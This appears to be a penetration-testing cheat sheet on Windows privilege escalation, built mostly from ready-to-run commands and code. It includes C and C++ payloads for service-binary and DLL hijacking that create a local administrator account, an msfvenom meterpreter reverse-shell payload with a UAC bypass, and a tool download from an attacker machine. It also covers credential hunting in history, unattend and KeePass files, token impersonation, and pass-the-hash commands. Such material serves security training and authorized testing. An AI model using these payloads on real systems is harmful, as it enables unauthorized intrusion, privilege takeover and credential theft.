---
title: "Windows privilege escalation"
weight: 3
description: "Learn about various techniques and methods for privilege escalation on Windows systems, including UAC bypass, credential dumping and more, with detailed notes and code examples."
---

# Windows privilege escalation

{{< hint style=notes >}}
**Note**: if you have a valid user credential you can authenticate in windows target from SMB, RDP, WinRM.
{{< /hint >}}

---

## Automation script

**WinPEAS** \[[🔗](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)]
```powershell
powershell

# Transfer winPEAS file
iwr -uri http://<ATTACKER_MACHINE>/winPEASx64.exe -Outfile winPEAS.exe

.\winPEAS.exe
```

**PrivescCheck** \[[🔗](https://github.com/itm4n/PrivescCheck)]
```dos
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```

**PowerUp.ps1** \[[🔗](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)] [Docs](https://powersploit.readthedocs.io/en/latest/Privesc/)
```powershell
powershell -ep bypass
. .\PowerUp.ps1

# Now you can run commands like Get-ModifiableServiceFile
Get-ModifiableServiceFile
```

{{< hint style=warning >}}
**Warning**: You should **never fully trust the output of a tool**, as it can sometimes be incorrect—even on simple tasks like detecting the target machine’s operating system.
{{< /hint >}}


---

## Execute commands as another user

* If the user is a member of the **Remote Desktop Users** group --> connect with RDP
* If the user is a member of the **Remote Management Users** group --> connect with WinRM
* If **you have access to a GUI** with an other user, you can use `Runas` to run a program as a different user. 

```powershell
runas /user:<USERNAME> cmd
```
After entering the password, a new command-line window opens, running under the specified user's account.

---

## History

**Get-History**

`Get-History` only shows commands executed before the current one in the same session.

{{< hint style=warning >}}
**Warning**: The history is session-based — it doesn’t persist across PowerShell windows by default. Each time you open a new console, the history starts fresh.
{{< /hint >}}

**Clear-History**

If a user runs `Clear-History`, it will only clear PowerShell’s in-session history, which can be retrieved using `Get-History`. 

{{< hint style=warning >}}
**Warning**: `Clear-History` **does not remove**:
* The command history saved by PSReadLine to disk (`ConsoleHost_history.txt`).
* The content seen with `Ctrl+R` or arrow keys if PSReadLine is still managing that memory buffer.
{{< /hint >}}

**Retrieve PSReadLine history**

```powershell
# Get history save path
(Get-PSReadlineOption).HistorySavePath

# Get content of the history file
type C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

**Retrieve transcript**

`Start-Transcript` \[[🔗](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.host/start-transcript?view=powershell-7.5)] starts recording everything that happens in your PowerShell session. 

By default, it stores the transcript in the following location using the default name:
* On Windows: `$HOME\Documents`
* On Linux or macOS: `$HOME`

The default filename is `PowerShell_transcript.<computername>.<random>.<timestamp>.txt`.

{{< hint style=notes >}}
**Notes**: A user can change the location of the transcript file by using the command: `Start-Transcript -Path "C:\transcripts\transcript0.txt"`. So, be sure to look for files that have names containing the word **transcript**.
{{< /hint >}}

---

## Password in configuration file (Unattend.xml)

An answer file is an XML-based file that contains setting definitions and values to use during Windows Setup. Answer files (or Unattend files) are used by Administrators when they are setting up fresh images as it allows for an automated setup for Windows systems.

```sh
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.xml
C:\Windows\system32\sysprep\sysprep.xml
```

Extract password and decode it (from base64)

---

## Find password manager database

E.g. search `*.kdbx`
```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

---

## Find sensitive information in configuration files

E.g. configuration files of XAMPP
```powershell
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
```

E.g. search docs in home directory of the user
```powershell
Get-ChildItem -Path C:\Users\<USERNAME>\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

---

## Service Binary Hijacking

Get a list of all installed Windows services:

**CMD** command. (WMIC is deprecated as of Windows 10, version 21H1)
```dos
wmic service get Name,DisplayName,PathName
```

**CMD one-liner**
```dos
for /f "tokens=2 delims=:" %s in ('sc query state^= all ^| findstr /R "^SERVICE_NAME:"') do @echo %s & sc qc %s | find "BINARY_PATH_NAME"
```

**Powershell**
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
```

{{< hint style=notes >}}
**Note**: When using network logons like WinRM or bind shells, non-admin users get “permission denied” errors with `Get-CimInstance` when querying services. Interactive logons (e.g., RDP) avoid this issue.
{{< /hint >}}

Focus on services installed by users and enumerate the permissions:

```powershell
icacls "C:\xampp\mysql\bin\mysqld.exe"

# F   Full access
# M   Modify access
# RX  Read and execute access
# R   Read-only access
# W   Write-only access
```

If we can modify the binary, we can replace it. So, create a binary and compile it:

```C
#include <stdlib.h>
int main ()
  {
    int i;
    i = system ("net user testuser somepassword /add");
    i = system ("net localgroup administrators testuser /add");
  }
```

{{< hint style=notes >}}
**Note**: Create a backup of the original binary service (C:\xampp\mysql\bin\mysqld.exe) before proceeding.
{{< /hint >}}

Now there are two way:

1. Restart the service:
```powershell
# 1. with net
net stop mysql
net start mysql

# 2. Restart-Service
Restart-Service -Name "mysql"
```

2. If your user doesn't have sufficient permissions to stop the service our alternative is to reboot the machine—if the service’s Startup Type is set to `Auto`, it should restart on boot

```powershell
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'} 

Name StartMode
---- ---------
mysql Auto
```

To reboot, the user needs `SeShutDownPrivilege`
```powershell
whoami /priv

Privilege Name      Description           State
=================== ====================  ========
SeShutdownPrivilege Shut down the system  Disabled
```

{{< hint style=notes >}}
**Note**: The `Disabled` state means the privilege isn't active in the current process. Here, it shows whoami hasn't requested `SeShutdownPrivilege` privilege.
{{< /hint >}}

Reboot:
```powershell
shutdown /r /t 0
```

---

## Service DLL Hijacking

{{< details summary="DLL search order" >}}
By default, modern Windows versions have safe DLL search mode enabled to reduce DLL hijacking risks. This mode, introduced by Microsoft, enforces a more secure DLL search order \[[🔗](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)], as shown below:

1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory.
5. The current directory.
6. The directories that are listed in the PATH environment variable.

{{< /details >}}

The goal of this attack is to hijack the DLL search order - a technique where an attacker places a malicious DLL in a location that is searched before the legitimate one. If the application or service attempts to load a DLL that doesn’t exist in its expected location, it may end up loading the attacker’s DLL instead.

To perform this attack, we first need to identify all the DLLs loaded by a specific service and detect any that are missing.

We can use Process Monitor (Procmon) to capture and filter events related to the target service:

{{< hint style=notes >}}
**Note**: Using Process Monitor requires administrative privileges, so you’ll need to copy the service binary to a local machine.
{{< /hint >}}

* Launch **Process Monitor**.
* **Add a filter** to show only events related to the service's process name.
* **Restart the service** while Procmon is actively capturing:

```powershell
Restart-Service <service>
```

* **Look for CreateFile events** where the service attempts to access a <name>.dll file across different directories.

In the Detail column of these events, if you see `NAME NOT FOUND`, it means the system attempted to locate the DLL in that path, but it wasn’t there. This indicates a potential opportunity to hijack the DLL.

To exploit this:
* Identify the first directory in the search order where the service attempts to load the missing DLL.
* If you have write permissions to that location, **place a malicious DLL with the same name**.

{{< details summary="Example of Cpp DLL" >}}
```Cpp
#include <stdlib.h>
#include <windows.h>
BOOL APIENTRY DllMain(
HANDLE hModule,
DWORD ul_reason_for_call,
LPVOID lpReserved )
{
  switch ( ul_reason_for_call )
  {
    case DLL_PROCESS_ATTACH:
    int i;
    i = system ("net user test yourpass /add");
    i = system ("net localgroup administrators test /add");
    break;
    case DLL_THREAD_ATTACH:
    break;
    case DLL_THREAD_DETACH:
    break;
    case DLL_PROCESS_DETACH:
    break;
  }
  return TRUE;
}
```

Compile the code:
```bash
gcc DLL_NAME.cpp --shared -o <DLL_NAME>.dll
```

{{< /details >}}

When the service restarts, it may load your malicious DLL instead of the legitimate one.

---

## Unquoted Service Paths

When a **Windows service** is installed with an **unquoted path** and the path contains **spaces**, Windows does **not know where the executable truly begins and ends** unless quotes (`"`) are used. It will **try to execute each potential path segment** until it finds a matching file. If one of these path segments is **writable by a low-privilege user**, you can place a **malicious executable** there, which will get executed with **SYSTEM privileges** the next time the service starts.

{{< details summary="What Windows will try to do" >}}
Suppose a Windows service is registered like this:

```dos
C:\Program Files\My App\bin\service.exe
```

Notice that the path has spaces and is not enclosed in quotes.

Here's what Windows will try to do:
Windows tries to execute the following, in this order:
* `C:\Program.exe`
* `C:\Program Files\My.exe`
* `C:\Program Files\My App\bin\service.exe` (this is the real one)

If `C:\Program Files\My App\bin\service.exe` doesn't exist, you can place a file called `C:\Program.exe`, that will get executed instead, with SYSTEM privileges.

{{< /details >}}

**To exploit this**:
* There must be an `unquoted service path` with spaces in it.

```dos
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

* One of the earlier-resolved paths must be `writable` by a low-privileged user. To check access rights, use `icacls` in each path. 
* You must be able to `create a malicious executable` in that path.

```C
#include <stdlib.h>
int main ()
  {
    int i;
    i = system ("net user testuser somepassword /add");
    i = system ("net localgroup administrators testuser /add");
  }
```

* The service must `restart` (manually or through a system reboot).


---

## Scheduled Tasks

Scheduled Tasks (a.k.a. Task Scheduler) are Windows components that let administrators schedule programs or scripts to **run automatically** at specific times or under certain conditions (like at login, boot, idle, etc.).

If a task runs something like:

```xml
<Action>
  <Exec>
    <Command>C:\Scripts\Backup.bat</Command>
  </Exec>
</Action>
```

… and `C:\Scripts\Backup.bat` is **writable by a low-priv user**, you can overwrite it with a malicious payload.

**To exploit this**:

1. We can view scheduled task with the following command:
```powershell
schtasks /query /fo LIST /v
```

Look for tasks with interesting information in the `Task To Run`, `Run As User`, `Next Run Time`, `Author` fields.

2. If you find a task running under a **high-privilege user**, check the permissions on the file it executes using `icalcs`.

3. **Replace the executable file** specified in the action of the scheduled task.

4. **Wait for the task to run**

---

## SeImpersonatePrivilege

`SeImpersonatePrivilege` is a Windows security privilege that allows a process to impersonate another user or process after authentication.

This privilege is commonly assigned to services and processes that need to act on behalf of users (for example, IIS).
By default, Local System, Network Service, Local Service, and some authenticated services have this privilege.

**To exploit this**:

{{< details summary="PrintSpoofer.exe" >}}

This works on **Windows 10** and **Server 2016/2019** https://github.com/itm4n/PrintSpoofer

1. Verify privileges:

```powershell
whoami /priv
```
Look for:

```powershell
Privilege Name                Description                    State
============================  =============================  ========
SeImpersonatePrivilege        Impersonate a client after...  Enabled
```

2. Copy the executable of PrintSpoofer.exe from [PrintSpoofer repository](https://github.com/itm4n/PrintSpoofer).

3. Execute it:

```powershell
.\PrintSpoofer64.exe -i -c cmd
```
Troubleshooting: https://juggernaut-sec.com/seimpersonateprivilege/#Troubleshooting_PrintSpoofer_Errors
Blog post: https://itm4n.github.io/printspoofer-abusing-impersonate-privileges
{{< /details >}}

{{< hint style=notes >}}
**Note**: There are other tools available to accomplish this, such as **Juicy Potato**, **Rogue Potato**, etc.
{{< /hint >}}

---

## UAC Bypass

User Account Control (UAC) is a feature that enables a consent prompt for elevated activities.

Prerequisites:

1. User must be a member of the Administrators group. `net localgroup administrators`
2. Full interactive shell with the victim like meterpreter (a common nc.exe shell is not enough).

**(1) Metasploit**

```sh
search bypassuac
```

**(2) UACME**

```sh
# 1. Step
ps
migrate <PID explorer.exe>

# 2. Step - Upload Akagi (Akagi64.exe if x64)

# 3. Step - Create payload with msfvenom
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o backdoor.exe

# 4. Step - Start a listener (exploit/multi/handler)

# 5. Step - Run Akagi
Akagi64.exe 23 <payload_full_path> # NOTE FULL PATH

# Once run, we will get meterpreter session - getprivs/getsystem to get elevated privs
```

---

## Impersonate Tokens

**Metasploit - incognito**

```sh
load incognito
list_tokens -u
```

```sh
 Delegation Tokens Available
 ========================================
 ANYTHING\Administrator
 NT AUTHORITY\LOCAL SERVICE
 
 Impersonation Tokens Available
 ========================================
 No tokens available
```

```sh
impersonate_token <token_name>
# E.g. impersonate_token ANYTHING\\Administrator 
# Note: the two backslashes
```

```sh
# You may need to migrate process to a <user> process
getpid
ps     
# PID: 2948 | PPID: 2036 NAME: explorer.exe | ARCH: X64 | SESSION:1 | USER: ANYTHING\Administrator | PATH: C:\Windows\explorer.exe

# Migrate process
migrate 2948
```

---

## Pass the Hash

Pass-the-Hash is a technique where you authenticate as a user without knowing the plaintext password. Instead, you can use the NTLM hash of the password to gain access to systems and resources.


```sh
# 1. with crackmapexec
crackmapexec smb <ip> -u <administrator> -H <NTLM hash> -x "ipconfig"

# 2. with psexec (impacket)
impacket-psexec -hashes <LM hash>:<NTLM hash> Administrator@<ip>

# 3. Method (Metasploit) -> windows/smb/psexec
set SMBPass <LM hash>:<NTLM hash>
```

{{< hint style=notes >}}
**Notes**:

* Empty LM hash: `AAD3B435B51404EEAAD3B435B51404EE` (means its non-use).
  * `AAD3B435B51404EEAAD3B435B51404EE:<NTLM>`
* With `hashdump` you have the right format
{{< /hint >}}

---

## Other

* Saved Windows Credentials
  * cmdkey /list
  * runas /savecred /user:admin cmd.exe
* Scheduled Tasks
* Insecure Permissions on Service Executable
* Insecure Service Permissions
* Windows Privileges
* Unpatched Software